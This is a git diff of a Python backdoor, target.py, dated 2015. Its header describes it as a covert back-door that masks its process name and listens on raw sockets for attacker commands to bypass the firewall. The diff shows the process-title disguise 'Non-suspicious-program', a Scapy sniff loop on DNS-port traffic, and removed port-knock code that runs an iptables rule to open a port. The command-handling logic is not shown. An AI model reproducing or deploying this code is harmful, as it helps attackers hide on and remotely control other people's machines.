@@ -1,3 +1,27 @@
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+--  SOURCE FILE:    target.py
+--
+--  AUTHOR:         Thilina Ratnayake
+--              
+--  PROGRAM:        Covert back-door that upon running, masks process name and 
+--                  listens for commands from an attacker on raw sockets
+--                  to circumvent the firewall.
+--
+--  FUNCTIONS:      sendCommand(string)
+--                  craftCommandPacket(string)
+--                  encryptCommand(string)
+--                  commandResult(packet)
+--
+--  DATE:           October 17, 2015
+--
+--  REVISIONS:      
+--
+--  NOTES:
+--  The program requires the PyCrypto and Scapy libraries for encryption and packet
+--  crafting respectively.
+--  'pip install pycrpyto' or https://www.dlitz.net/software/pycrypto/
+--  'pip install scapy' or http://www.secdev.org/projects/scapy/
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 import sys
 from scapy.all import *
 import os
@@ -37,59 +61,24 @@ def receivedPacket(packet):
         else:
             return False
 
-# def knockFilter1(packet):
-#     print "Stage 1"
-#     if IP in packet[0]:
-#         global clientIP
-#         global knockCounter
-#         clientIP = packet[IP].src
-#         print "Client IP is %s"%(clientIP)
-#         return True
-#     else:
-#         return False
-# def knockFilter2(packet):
-#     print "Stage 2"
-#     if IP in packet[0]:
-#         global clientIP
-#         global knockCounter
-#         if clientIP == packet[IP].src:
-#             print "Client IP is %s"%(clientIP)
-#             knockCounter = knockCounter + 1
-#
-#             return True
-#     else:
-#         return False
-# def knockFilter3(packet):
-#     if IP in packet[0]:
-#         global clientIP
-#         global knockCounter
-#         if clientIP == packet[IP].src and knockCounter == 1:
-#             print "Client IP is %s"%(clientIP)
-#             print "PORT KNOCK COMPLETE!"
-#             ##TRIGGER FIREWALL CHANGE HERE
-#             openPort = string(packet[UDP].srcport)
-#             f = os.popen("iptables -A INPUT -p TCP --dport %s -j ACCEPT"%openPort)
-#             print "Firewall opened for port " + openPort
-#             knockCounter = 0
-#             return True
-#     else:
-#         return False
-#
-#     return True
-
-#Set process title to something less suspicious
-setproctitle.setproctitle("Non-suspicious-program")
 
 
-knockCounter = 0
+
+if __name__ == "__main__":
+
+    #Set process title to something less suspicious
+    setproctitle.setproctitle("Non-suspicious-program")
 
 
-#As a client, listen for the port knocks
-# print "Waiting for knocks"
-# sniff(filter='udp and src port 514', stop_filter=knockFilter1)
-# sniff(filter='udp and src port 515', stop_filter=knockFilter2)
-# sniff(filter='udp and src port 516', stop_filter=knockFilter3)
-#Listen for connections
-listening = True;
-while listening:
-    sniff(filter='tcp and dst port 53 and src port 500', stop_filter=receivedPacket)
+    knockCounter = 0
+
+
+    #As a client, listen for the port knocks
+    # print "Waiting for knocks"
+    # sniff(filter='udp and src port 514', stop_filter=knockFilter1)
+    # sniff(filter='udp and src port 515', stop_filter=knockFilter2)
+    # sniff(filter='udp and src port 516', stop_filter=knockFilter3)
+    #Listen for connections
+    listening = True;
+    while listening:
+        sniff(filter='tcp and dst port 53 and src port 500', stop_filter=receivedPacket)
